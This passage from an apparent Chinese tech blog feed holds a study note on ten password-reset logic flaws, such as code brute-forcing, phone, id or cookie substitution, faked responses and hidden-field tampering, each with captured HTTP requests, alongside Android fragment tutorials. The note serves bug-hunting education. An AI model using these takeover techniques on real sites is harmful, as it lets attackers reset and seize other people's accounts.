jieguo.append(zidian[i]) panduan = raw_input("是否继续输入？[Y/N]") if(panduan == 'N' or panduan =='n'): print("Bye Bye~") print("最后的密码是:") print(jieguo) exit() 效果演示 关于第N个版本当然目前来看这个POC验证代码在用户体验上还不是那么友好而且代码中zidian这个在代码中显得过于臃肿。后期肯定还是可以再完善这个代码的。后期的改进方向: 从文件中加载字典 1次性输入全部密码 然后解密 图形化界面 WEB界面 添加修改算法规则，灵活破解‘ 当然真正要全部实现这些功能的话，在Python代码上面还得多多的下功夫才可以。↖(^ω^)↗加油]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>国光</tag>
        <tag>逆向</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用户密码重置找回10种常见姿势]]></title>
    <url>%2F2017%2F10%2Fresetpass.html</url>
    <content type="text"><![CDATA[本篇文章是参考大神carry_your讲师(360补天排名第一)的任意用户密码重置的10种常见姿势总结的笔记。原视频地址:https://www.ichunqiu.com/course/59045 介绍本次课程主要针对挖掘逻辑漏洞中的任意用户密码重置方法和原理从10种常见情况进行了讲述，并结合漏洞挖掘中的真实案例场景与数据包演示了重置密码漏洞的检测方法，让大家对这一类逻辑漏洞有从浅入深，逐步深奥的见解。 验证码不失效 造成原因找回密码的时候获取的验证码缺少时间限制仅值判断了验证码是够正确未判断验证码是否过期 测试方法通过枚举找到真正的验证码输入验证码完成验证 案例输入目标手机号，获取验证码随意输入验证码1234点击下一步，拦截数据包:数据包12345678910111213POST /Account/CheckYQCode HTTP/1.1Host: www.xxxx.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflate, brContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer:http://www.xxxx.cn/userCenter/toForgetPsdPage.html?mobile=Content-Length: 11Cookie: ASP.NET_SessionId=30jfruwn22h2xng3ahhzo2jxConnection: close YQCode=1234 这种验证码不失效而且验证码是4位数的情况下,直接爆破 看包的返回长度或者内容来找到正确的验证码。得到正确的验证码是1059然后到网站上输入验证码跳转到输入新密码的页面完成重置密码 总结这种验证码不失效的情况现在已经是非常少见的了，而且验证码的位数也很少有简单的4位验证码了。现在绝大多数是这样的：6位数的验证码而且15分钟内有效，这样子的话爆破的可能性就非常的低了。 验证码直接返回 造成原因输入手机号后点击获取验证码，验证码在客户端生成，并直接返回在Response以方便对接下来的验证码进行比对。 测试方法直接输入目标手机号，点击获取验证码，并观察返回包即可。在返回包中得到目标手机号获取的验证码，进而完成验证，重置密码成功。 案例 总结这种情况上次狗哥也拿出来了这样一个类似的案例，记得他那个情况是在找回密码返回包中，直接返回了旧密码的md5值，然后修改返回包可以直接重置管理员的密码。 验证码未绑定用户 造成原因输入手机号和验证码进行重置密码的时候，仅对验证码是够正确进行了判断，未对该验证码是否与手机号匹配做验证。 测试方法在提交手机号和验证码的时候，替换手机号为他人手机号进行测试，成功通过验证并重置他人密码。 案例一首先使用自己的手机号接收验证码，然后输入自己的手机号接收到的验证码，点击下一步并拦截数据包。最后替换数据包里的目标手机号，然后发包数据包12345678910111213POST /tofindPasswordByPhone3.do HTTP/1.1Host: www.xxxx.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://www.xxxx.com/tofindPasswordByPhone2.do?mobile=131234xxxxx&amp;captcha=qkan&amp;checkbox=onCookie: JSESSIONID=D4DB3147DBF941799B9CA74E4364F2F9; CNZZDATA1257851838=1754906772-1467355802-%7C1467355802; Hm_lvt_203f11422b4fcc8e2be8c54b036c5ff9=1467357432; Hm_lpvt_203f11422b4fcc8e2be8c54b036c5ff9=1467357978; smsRand=&quot;d9[x]1gSjADrs[d]&quot;; td_cookie=699947232; Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 33 mobile=13888888888&amp;smsCode=561768 mobile的值改为我们想要重置的用户手机号点击下一步，跳转到设置密码的页面输入新密码，提交就成功重置了13888888888的密码。 案例二这个案例是验证码未绑定用户延伸一下，有时候测试会遇到这种，我们发现用户名被加密了，有无法得到具体的加密算法，怎么办？其实大部分这种情况我们都不需要知道加密算法，比如这里例子，得到liuyy的加密后的值是80e688602c4b11e66320c421e3b71ef2，那么我们就可以直接利用这个keyCode参数了。步骤是一样的，输入我们的用户名和收到的验证码，然后把我们的keycode替换为liuyy的那个keycode，这样就可以重置liuyy的密码了。(漏洞原因还是是判断了验证码是否正确，而没有判断该验证码是否跟该用户匹配。) 总结这种情况没有遇到过，学习了，以后在找回密码的时候会这么测试的。现在看来对于白帽子来说有2个手机号是多么的方便了。案例二中如何获取到其他用户的keyCode呢？这里的话正常走一遍找回密码的流程，然后抓包就会在数据包中找到加密后的keyCode了，这样就可以重置任意用户的密码了。 修改接受验证码的手机或邮箱 造成原因用户名、手机号、验证码三者没有统一进行验证，仅判断了三者中的手机号和验证是否匹配和正确，如果正确则判断成功并进入下一流程。 测试方法输入用户名获取验证码，修改接收验证码的手机号为自己的号码，自己手机成功接收验证码，提交到网站进行验证，验证成功并进入下一流程。 案例点击找回密码，首先我们输入zhangwei，然后点击获取验证码，这个时候把手机号改为我们自己的号码，(一般情况下这里是在数据包中进行修改的)，然后输入我们自己的号码和验证码，成功跳到重置密码的页面，密码重置成功。 总结carry_your大神说这种情况下还是比较常见的，这里不是很能理解，为什么程序员开发的时候不做用户名和手机号的匹配呢？我平时测试的时候，很少遇到这种不做用户名和手机号匹配的情况 ⊙﹏⊙||| 本地验证绕过 造成原因客户端在本地进行验证码是否正确的判断，而该判断结果也可以在本地修改，最终导致欺骗客户端，误以为我们已经输入了正确的验证码。 测试方法重置目标用户，输入错误验证码，修改返回包，把错误改为正确，即可绕过验证步骤，最终重置用户密码。 案例输入手机号13888888888，输入验证码123456，验证码错误的时候，返回包返回的是0这里我们所做的就是把0修改为1，可以借工具修改返回包，我们把0改为1，然后查看页面，成功跳转到修改密码的页面，输入新密码即可修改用户13888888888的密码 总结who_jeff大神曾经分享给过这样一个类似的案例，当时他是在一个安卓app上进行抓包测试的，当时就直接修改返回包 来欺骗本地的app客户端的，成功重置任意用户的密码。 跳过验证步骤 造成原因对修改密码的步骤，没有做校验，导致可以直接输入最终修改密码的网址，直接跳转到该页面，然后输入新密码达到重置密码的目的。 测试方法首先使用自己的账号走一次流程，获取每个步骤的页面链接，然后记录页面3对应的输入新密码的链接，重置他人用户时，获取验证码后，直接输入页面3链接到新密码的界面，输入密码重置成功。 案例首先我们走一下所有的步骤，页面1、页面2、页面3，然后记录下页面3的链接然后尝试重置他人的用户。(ps:页面3是在我们的邮箱里接收到的链接)是某集团系统，所以用户wangshuai，邮箱对应wangshuai@xxx.com.cn使用账户wangshuai，点击获取验证码，然后补齐下面的链接 https://xxx/page/login/veifyAccess.html?username=wangshuai&amp;email=wangshuai@xxx.com.cn，访问后即可直接重置该用户的密码 总结这个漏洞不用按照正常的流程来走，这里的话直接补齐设置新密码的链接，然后利用这里链接可以直接重置任意用户的密码。 未校验用户字段的值 造成原因在整个重置密码的流程中，只对验证码和手机号做了校验，未对后面设置新密码的用户身份做判断，导致在最后一步通过修改用户身份来重置他人的密码。 测试方法使用自己的手机号走流程，在走到最后一个设置密码的流程时，修改数据包里的用户信息。 案例使用自己的手机号走流程，最后一步的数据包:数据包123456789101112POST /yw_xxx/regist/saveNewPwd.action HTTP/1.1Host: www.xxx.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://www.xxx.com/yw_xxx/regist/toSetPwd.actionCookie: td_cookie=2080441838; JSESSIONID=530DD2516536F63131A1C098089CF2FB; JSESSIONID=5F3E182FAE378C1E799342C059F923B9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 57 upassword=qwer1111&amp;upassword1=qwer1111&amp;mphone=131234xxxxx 我们可以看到密码找回成功而且参数中只有密码和用户名，cookie值无效，只需要修改指定用户名的值，就可以重置他人的用户密码。修改用户为13888888888，在发送数据包，我们就成功的把138的密码修改为qwer111 总结这里的话关键是在最后一步重置密码的时候替换目标手机号，这种其实也是比较暴力的，拿到这个链接的话 可以无条件批量重置任意用户的密码，这里面利用burp可以批量枚举手机号码的mphone参数。 修改密码处id可替换 造成原因修改密码的时候，没有对原密码进行判断，且根据id的值来修改用户的密码，类似的SQL语句：1update user set password="qwer1234" where id = ‘1’ 修改数据包里的id的值，即可修改他人密码。 测试方法修改自己用户密码，抓取数据包，替换数据包中用户对应的id值，即可修改他人的密码。 案例点击立即提交，得到右边的数据包，测试发现修改id为5，就可以把对应的用户密码修改为123456，没有对用户的原始密码判断，也没有判断id是否属于该用户。数据包12345678910111213POST /Index/user/userinfo.html HTTP/1.1Host: 192.168.8.31:8088Content-Length: 63Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://192.168.8.31:8088Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 UBrowser/6.1.2107.202 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://192.168.8.31:8088/Index/user/userinfo.htmlAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSID=28af1649bcbcb0e0dd83afa017691a03; __sticket=hKdyp310daeBfKWqgnimZoB2zrKwespkfaaVm4KKpN-Fp3tokWJ-YJeQqWOXe9mpf5-br8dox6SUlX_Rgn2t05GVpZ6Jqoaqg3zMoY-rnnM.6.a. id=6&amp;user_name=kefu1&amp;password=123456&amp;name=kefu123&amp;email=&amp;phone= 这里的id和kefu1的所在参数user_name并没有去判断是否为用一个用户，这里修改id是可以任意修改其他用户的密码的。这里在不修改user_name的情况下，只修改id值就成功重置了用户的密码。 总结这种也比较暴力流氓，可以通过枚举id的值 ，来大批量重置任意用户密码的漏洞，因为不需要用户名了，只需要知道id值即可，危害比较大。 cookie值的替换 造成原因重置密码走到最后一步的时候仅判断唯一的用户标识cookie是否存在，并没有判断该cookie有没有通过之前重置密码过程的验证，导致可替换cookie重置他人用户密码。(cookie可指定用户获取。) 测试方法重置自己用户密码到达最后阶段，抓到数据包，并在第一阶段重新获取目标用户cookie，替换cookie到我们抓取的数据包中，发包测试。 案例首先我们重置自己的用户wang111的密码到最后一步，成功重置密码，抓到如下数据包。数据包1234567891011121314POST /ppc/valid/resetPassword.do HTTP/1.1Host: www.xxx.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://www.xxx.com/ppc/valid/showResetPassword.doContent-Length: 37Cookie: JSESSIONID=E1AC27A7302C03C9432DE2254B99311AConnection: close password=qwer1111&amp;rePassword=qwer1111 这里的数据包中并没有出现用用户的参数信息，所以这里面的话，可以判断这里应该是用cookie作为身份的判断的。到第一步去获取验证码的时候，点击下一页，可以获取到该用户wangshuai对应的内容1Cookie: JSESSIONID=E1AC27A7302C03C9432DE2254B99311A 拿到这个cookie就意味着可以利用这个身份判断标识去重置这个用户的密码了。替换得到的cookie值，即把cookie对应的用户wangshuai的密码修改为qwer1234 总结关键点:cookie可指定用户获取,尝试用他人账号来找回密码的时候，抓取数据包，可以从中提取出cookie值，然后就可以利用这个cookie值，就可以重置指定用户的密码了。 修改信息时替换字段值 造成原因在执行修改信息的sql语句的时候，用户的密码也当作字段执行了，而且是根据隐藏参数loginid来执行的，这样就导致修改隐藏参数loginid的值，就可以修改他人的用户密码。 测试方法修改个人资料的时候，抓取数据包，然后来修改数据包的参数和对应的值，参数名一般可以在其他地方找到，替换隐藏参数即可修改他人的密码等信息。 案例点击 保存信息 抓取数据包数据包123456789101112131415161718192021222324252627POST /xxxxx/employee_updateEmployeeInf.action HTTP/1.1Host: www.xxxxx.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflate, brReferer: https://www.xxxxx.com/xxxxx/employee_forUpdate.actionCookie: JSESSIONID=A115648DB5F49215078E583ABB6A665A; FLGSID=FLGSRV1; loginUrl=&quot;&quot;Connection: closeContent-Type: multipart/form-data;boundary=---------------------------222991508618208Content-Length: 709-----------------------------222991508618208Content-Disposition: form-data; name=&quot;mobileNo&quot;177XXXXXXXX-----------------------------222991508618208Content-Disposition: form-data; name=&quot;departId&quot;49-----------------------------222991508618208Content-Disposition: form-data; name=&quot;minority&quot;-----------------------------222991508618208Content-Disposition: form-data; name=&quot;sex&quot;1-----------------------------222991508618208Content-Disposition: form-data; name=&quot;birthday&quot;19920829-----------------------------222991508618208Content-Disposition: form-data; name=&quot;photo&quot;; filename=&quot;&quot;Content-Type: application/octet-stream-----------------------------222991508618208-- 可以看到数据包里只有这几个参数mobileNo、departId、minority、sex、birthdaymobileNo是用户对应的手机号我们尝试修改mobileNo的值，所获得的效果就是我们的手机号修改了，而这个手机号本身就是可以修改的。这个数据包中并没有找到我们标识用户身份的参数信息，唯一可以修改的手机号也只是表单中直接修改可以改变的。接下来我们去找一下隐藏参数。。。1view-source:https://www.xxx.com/ua/employee/forUpdate.do 查看下这个页面的源代码，找到了一个参数loginId，这个参数是对应用户身份的而我们发现 上面的数据包里没有这个参数，那么我们是否可以自己添加上去呢？这里修改数据包，添加字段loginId，并且把值修改为他人的用户，发包返回修改成功，这样就成功的把用户871xxxx的密码改为跟我们密码相同的值。 总结最后一种要稍微复杂一点，得去找到隐藏参数:loginId 然后再修改数据包，以后挖洞的时候，多留意这些。]]></content>
      <categories>
        <category>hacker</category>
      </categories>
      <tags>
        <tag>国光</tag>
        <tag>密码找回</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用布局与组件创建用户界面]]></title>
    <url>%2F2017%2F10%2Fandroid6.html</url>
    <content type="text"><![CDATA[在为CriminalIntent应用添加crime记录时间及处理状态的过程中，我们将学习到更多有关布局和组件的知识 升级 Crime 类打开Crime.java文件，新增两个实例变量。Date变量表示crime发生的时间，boolean变量表示crime是否已得到处理Crime.java 编写get和set方法Crime.java接下来，使用新组件更新fragment_crime.xml文件中的布局，然后在CrimeFragment.java文件中实例化并使用这些组件。 更新布局效果图本章结束时，CrimeFragment视图应如图所示要得到这个界面还需要为为CrimeFragment的布局添加四个组件：两个TextView组件、一个Button组件以及一个CheckBox组件 添加更新 fragment_crime.xml 组件fragment_crime.xml12345678910111213141516171819202122232425262728293031323334353637383940&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="match_parent" android:layout_margin="16dp" android:orientation="vertical"&gt; &lt;TextView android:layout_width="match_parent" android:layout_height="wrap_content" android:text="@string/crime_title_label" style="?android:listSeparatorTextViewStyle" /&gt; &lt;EditText android:id="@+id/crime_title" android:layout_width="match_parent" android:layout_height="wrap_content" android:hint="@string/crime_title_hint"/&gt; &lt;TextView android:layout_width="match_parent" android:layout_height="wrap_content" android:text="@string/crime_details_label" style="?android:listSeparatorTextViewStyle" /&gt; &lt;Button android:id="@+id/crime_date" android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_marginLeft="16dp" android:layout_marginRight="16dp" /&gt; &lt;CheckBox android:id="@+id/crime_solved" android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_marginLeft="16dp" android:layout_marginRight="16dp" android:text="@string/crime_solved_label" /&gt;&lt;/LinearLayout&gt; 这里会有几处代码提示找不到资源id 这里完善一下 strings.xml 即可 完善 strings.xmlstrings.xml1234567&lt;resources&gt; &lt;string name="app_name"&gt;CriminalIntent&lt;/string&gt; &lt;string name="crime_title_hint"&gt;请为这个陋习输入标题&lt;/string&gt; &lt;string name="crime_title_label"&gt;标题&lt;/string&gt; &lt;string name="crime_details_label"&gt;详情&lt;/string&gt; &lt;string name="crime_solved_label"&gt;已解决&lt;/string&gt;&lt;/resources&gt; 生成并使用组件接下来，要让CheckBox显示Crime是否已得到处理。用户勾选清除CheckBox时，Crime的mSolved变量的状态值也需得到相应的更新。当前，新增Button要做的就是显示Crime类中mDate变量的日期值 添加组件实例变量CrimeFragment.java 设置Button上的文字显示在onCreateView(...)方法中，引用新添加的按钮，设置它的文字属性值为crime日期，然后暂时禁用它CrimeFragment.java禁用按钮可以确保它不响应用户的单击事件。禁用后，按钮的外观样式也会发生改变（变为灰色），表明它已处于禁用状态。 等到第12章设置监听器时，我们会启用它。 侦听CheckBox状态的变化CrimeFragment.java创建OnCheckedChangeListener时，Android Studio会提供两个导入选项。确认选择的是android.widget.CompoundButton。运行CriminalIntent应用。尝试勾选清除CheckBox状态，欣赏一下显示日期的禁用Button吧运行效果图 深入探讨 XML 布局属性来回顾fragment_crime.xml文件中添加的一些属性定义，同时解答可能令人困扰的组件与属性相关问题 样式、主题及主题属性样式（style）是XML资源文件，含有用来描述组件行为和外观的属性定义。例如，下列样式资源能够配置组件，让其显示的文字大小大于正常值:1234&lt;style name="BigTextStyle"&gt; &lt;item name="android:textSize"&gt;20sp&lt;/item&gt; &lt;item name="android:padding"&gt;3dp&lt;/item&gt;&lt;/style&gt; 我们可以创建自己的样式文件（创建方法请参见第20章）。具体做法是将属性定义添加并保存在res/values/目录下的样式文件中，然后在布局文件中以@style/my_own_style(样式文件名)的形式引用再来看看fragment_crime.xml文件中的两个TextView组件。每个组件都有一个引用Android自带样式文件的style属性。该预定义样式来自于应用的主题，能让屏幕上的TextView组件看起来是以列表样式分隔开的。主题是各种样式的集合。从结构上来说，主题本身也是一种样式资源，只不过它的属性指向了其他样式资源。 dp、sp 以及屏幕像素密度在fragment_crime.xml文件中，我们以dp为单位来指定边距属性值。dp单位已在之前的布局文件中出现过了，下面我们来具体学习一下。有时需为视图属性指定大小尺寸值（通常以像素为单位，有时也用点、毫米或英寸）。最常见的属性有： 文字大小（text size），指定设备上显示的文字像素高度； 边距（margin），指定视图组件间的距离； 内边距（padding），指定视图外边框与其内容间的距离。 么问题来了，假如图像完成了自动适配，但边距无法缩放适配，又或者用户配置了大于默认值的文字大小，会发生什么情况呢？为解决这些问题，Android提供了密度无关的尺寸单位（density-independent dimension unit）。使用这种单位，可在不同屏幕密度的设备上获得同样的尺寸。无需进行麻烦的转换计算，应用运行时，Android会自动将这种单位转换成像素单位 dp（或dip）英文density-independent pixel的缩写，意为密度无关像素。在设置边距、内边距或任何不打算按像素值指定尺寸的情况下，通常都使用dp这种单位。如果设备屏幕密度较高，密度无关像素会相应扩展至整个屏幕。1dp单位在设备屏幕上总是等于1/160英寸。使用dp的好处是，无论屏幕密度如何，总能获得同样的尺寸。 sp英文scale-independent pixel的缩写，意为缩放无关像素。它是一种与密度无关的像素，这种像素会受用户字体偏好设置的影响。我们通常会使用sp来设置屏幕上的字体大小。 pt、mm、in类似于dp的缩放单位。允许以点（1/72英寸）、毫米或英寸为单位指定用户界面尺寸。但在实际开发中不建议使用这些单位，因为并非所有设备都能按照这些单位进行正确的尺寸缩放配置 在本书及实际开发中，我们往往只会用到dp和sp两种单位。Android在运行时会自动将它们的值转换为像素单位。 挑战练习使用android.text.format.DateFormat类实例实现时间显示的优化CrimeFragment.javaCrimeFragment.java12345mDateButton = (Button) v.findViewById(R.id.crime_date); String date = (String) DateFormat.format("yyyy年MM月dd日E kk:mm", mCrime.getDate()); mDateButton.setText(date); //mDateButton.setText(mCrime.getDate().toString()); mDateButton.setEnabled(false); 网上资料注意，我们可以格局需要来设定日期的格式模板，主要模板如下：12345678910&quot;MM/dd/yy h:mmaa&quot; -&gt; &quot;11/03/87 11:23am&quot;&quot;MMM dd, yyyy h:mmaa&quot; -&gt; &quot;Nov 3, 1987 11:23am&quot;&quot;MMMM dd, yyyy h:mmaa&quot; -&gt; &quot;November 3, 1987 11:23am&quot;&quot;E, MMMM dd, yyyy h:mmaa&quot; -&gt; &quot;Tues , November 3, 1987 11:23am&quot;&quot;EEEE, MMMM dd, yyyy h:mmaa&quot; -&gt; &quot;Tues day, Nov 3, 1987 11:23am&quot;&quot;YYYY年MM月dd日,kk:mm&quot; -&gt; 2014年09月30日,11:23用24小时制：&quot;EEEE, MMMM dd, yyyy kk:mm&quot; -&gt; &quot;Tues day, Nov 3, 1987 23:23&quot;其中：12小时制 ：hh; 24小时制: kk，如果用 SimpleDateFormat ，则为： hh; HH]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>国光</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[UI fragment与fragment 管理器]]></title>
    <url>%2F2017%2F10%2Fandroid5.html</url>
    <content type="text"><![CDATA[把书上第7章的Android代码重新详细的整理了一遍，之前写的不够认真，思路很乱 创建新的项目命名activity为CrimeActivity，单击Finish按钮完成 添加支持库依赖然后找到support-v4库后 单机ok添加主持库添加完新的支持库依赖后，app/build.gradle已经更新了: 修改模板代码将CrimeActivity的超类更改为FragmentActivityCrimeActivity.java12345678910111213package com.sqlsec.www.criminalintent;import android.support.v4.app.FragmentActivity;import android.os.Bundle;public class CrimeActivity extends FragmentActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_crime); &#125;&#125; 创建 Crime 类在进一步完善CrimeAcitivty类之前，我们先来为CriminalIntent应用创建模型层的Crime类Crime.java1234567891011package com.sqlsec.www.criminalintent;import java.util.UUID;public class Crime &#123; private UUID mId; private String mTitle; public Crime() &#123; mId = UUID.randomUUID(); &#125;&#125; 接下来为成员变量mId生成一个get方法，为成员变量mTitle生成get和set方法Crime.java1234567891011121314151617181920212223242526package com.sqlsec.www.criminalintent;import java.util.UUID;public class Crime &#123; private UUID mId; private String mTitle; public Crime() &#123; mId = UUID.randomUUID(); &#125; public UUID getId() &#123; return mId; &#125; public String getTitle() &#123; return mTitle; &#125; public void setTitle(String title) &#123; mTitle = title; &#125;&#125; 代码变动部分1234567891011public UUID getId() &#123; return mId; &#125; public String getTitle() &#123; return mTitle; &#125; public void setTitle(String title) &#123; mTitle = title; &#125; UI fragment 相关这里普及一些理论上的知识，为托管UI fragment，activity必须做到: 在布局中为fragment的视图安排位置 管理fragment实例的生命周期 fragment的生命周期。类似于activity的生命周期，它具有停止、暂停以及运行状态，也拥有可以覆盖的方法，用来在关键节点完成一些任务。 activity托管UI fragment有如下两种方式： 在activity布局中添加fragment 在activity代码中添加fragment 第一种直接在布局中添加fragment不够灵活，相当于是将fragment与activity绑定在了一起了，并且activity的生命周期过程中，无法切换fragment视图。 第二种方式比较复杂，但也是唯一可以在运行时控制fragment的方式。我们自行决定何时添加fragment以及随后可以完成何种具体任务；也可以移除fragment，用其他fragment代替当前fragment，然后重新添加已移除的fragment。为了真正灵活的开发设计，这里我们当然选择第二种方法 在 activity 代码中 fragment 安排位置修改原来的布局文件res/layout/activity_crime.xmlactivity_crime.xml1234&lt;FrameLayout android:id="@+id/fragment_container" xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="match_parent" /&gt; 修改后的效果如下:现在当前的activity 布局文件仅由一个服务于单个fragment的容器组成，但是托管activity布局其实也可以很复杂，可以自定义多个容器视图组成。不过现在只托管了一个fragment现在看下效果预览:可以看到 空空如也，表急，待会我们来写fragment的视图代码，然后在放到这个activity中去。 创建 UI fragment创建UI fragment和创建activity的步骤相同，在Android视图下展开res-layout文件夹，右键 新建Layout resourse file命名为fragment_crime.xml 在layout文件中添加文本栏来存放 crime 的标题首先建立一个垂直LinearLayout布局，里面再包含一个EditText组件，EditText组件有一块区域，可供用户添加或编辑文字信息。效果预览完整的代码如下:fragment_crime.xml12345678910111213&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="match_parent" android:layout_margin="16dp" android:orientation="vertical"&gt; &lt;EditText android:id="@+id/crime_title" android:layout_width="match_parent" android:layout_height="wrap_content" android:hint="@string/crime_title_hint"/&gt;&lt;/LinearLayout&gt; 在这里@string/crime_title_hint这里strings.xml文件中是没有完善的，所以得增加完善一下strings.xml文件strings.xml1234&lt;resources&gt; &lt;string name="app_name"&gt;CriminalIntent&lt;/string&gt; &lt;string name="crime_title_hint"&gt;请为这个陋习输入标题&lt;/string&gt;&lt;/resources&gt; 代码变动部分1&lt;string name="crime_title_hint"&gt;请为这个陋习输入标题&lt;/string&gt; 创建 CrimeFragment 类首先创建类CrimeFragment，然后继承Fragment类CrimeFragment.java123456package com.sqlsec.www.criminalintent;import android.support.v4.app.Fragment;public class CrimeFragment extends Fragment&#123;&#125; 作用CrimeFragment类是与模型及视图对象交互的控制器，用于显示特定crime的明细信息，并在用户修改这些信息后立即进行更新。 一般情况下通过activity生命周期完成了大部分的工作，这里面我们现在所使用的fragment和activity方法是差不多的，所使用的方法也是差不多的。 新增Crime成员变量完成onCreate方法CrimeFragment.java代码变动部分123456789public class CrimeFragment extends Fragment&#123; private Crime mCrime; @Override public void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); mCrime = new Crime(); &#125;&#125; 这里面的Fragment.onCreate(Bundle)是公共方法，而Activity.onCreate(Bundle)是保护方法Fragment.onCreate(...)方法及其他Fragment生命周期方法必须是公共方法因为托管fragment的activity要调用它们。其次，类似于activity，fragment同样具有保存及获取状态的bundle。如同使用Activity.onSaveInstanceState(Bundle)方法那样，我们也可以根据需要覆盖Fragment.onSaveInstanceState(Bundle)方法。 fragment的视图并没 有在Fragment.onCreate(...)方法中生成。虽然我们在Fragment.onCreate(...)方法中配置了fragment实例，但创建和配置fragment视图是另一个fragment生命周期方法完成的：12public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) 这个方法实例化了fragment视图的布局，然后将实例化的View返回给托管activity这里面的LayoutInflater以及ViewGroup是实例化布局的 必要的参数，这里的Bundle是用来恢复存储数据的，可以供该方法从保存状态下重建视图。 覆盖onCreateView(…)方法CrimeFragment.java中，添加onCreateView(...)方法的实现代码，从fragment_crime.xml布局中实例化并返回视图CrimeFragment.java代码变动部分12345@Override public View onCreateView(LayoutInflater inflater, ViewGroup container,Bundle savedInstanceState)&#123; View v = inflater.inflate(R.layout.fragment_crime,container,false); return v; &#125; 在 onCreateView(...) 方法中， fragment 的视图是直接通过调用 LayoutInflater.inflate(...)方法并传入布局的资源ID生成的 第二个参数是视图的父视图，我们通常需要父视图来正确配置组件。第三个参数告知布局生成器是否将生成的视图添加给父视图。这里，我们传入了false参数，因为我们将以activity代码的方式添加视图。 生成并使用EditText组件CrimeFragment.javaFragment.onCreateView(...)方法中的组件引用几乎等同于Activity.onCreate(...)方法的处理。唯一的区别是我们调用了fragment视图的View.findViewById(int)方法。TextWatcher有三种方法，不过现在只需关注其中的onTextChanged(...)方法。在onTextChanged(...)方法中，调用CharSequence（代表用户输入）的toString()方法。该方法最后返回用来设置Crime标题的字符串到这里CrimeFragment类的代码功能基本上是完成了但是用户现在还看不到用户界面和检验代码，因为fragment无法将自己的视图显示在屏幕上，我们需要先把CrimeFragment添加到CrimeActivity上面。 添加 UI fragment 到 FragmentManagerActivity类中相应添加了FragmentManager类。FragmentManager类负责管理fragment并将它们的视图添加到activity的视图层级结构中。FragmentManager类具体管理的是： fragment队列 fragment事务回退栈图解在本次开发是这个应用中，我们只需要关心FragmentManager管理的fragment队列即可。首先要将fragment添加到activity中，可以直接调用activity的FragmentManager 获取FragmentManager首先需要获取FragmentManager本身。关键代码1234567891011121314FragmentManager fm = getSupportFragmentManager(); ``` 这里使用了支持库及`FragmentActivity`类，所以这里调用的方法是`getSupportFragmentManager()`。 ## 添加一个CrimeFragment![](http://image.3001.net/images/20171012/1507816598360.png) **关键代码** ```javaFragment fragment = fm.findFragmentById(R.id.fragment_container); if(fragment == null)&#123; fragment = new CrimeFragment(); fm.beginTransaction().add(R.id.fragment_container,fragment).commit(); &#125; 这段代码创建并提交了一个fragment事务:fragment事务被用来添加、移除、附加、分离或替换fragment队列中的fragment。FragmentManager.beginTransaction()方法创建并返回FragmentTransaction实例。可以这么理解:创建一个新的fragment事务，加入一个添加操作，然后提交该事务。add(...)方法是整个事务的核心，它含有两个参数：容器视图资源ID和新创建的CrimeFragment。 容器视图资源ID我们应该很熟悉了，它是定义在activity_crime.xml中的FrameLayout组件的资源ID。容器视图资源ID的作用 告诉FragmentManager，fragment视图应该出现在activity视图的什么位置； 用作FragmentManager队列中fragment的唯一标识符 如需从FragmentManager中获取CrimeFragment，使用容器视图资源ID就行了:12FragmentManager fm = getSupportFragmentManager();Fragment fragment = fm.findFragmentById(R.id.fragment_container); FragmentManager使用FrameLayout组件的资源ID去识别CrimeFragment，如果要向activity添加多个fragment，通常需要分别为每个fragment创建不同ID的容器。 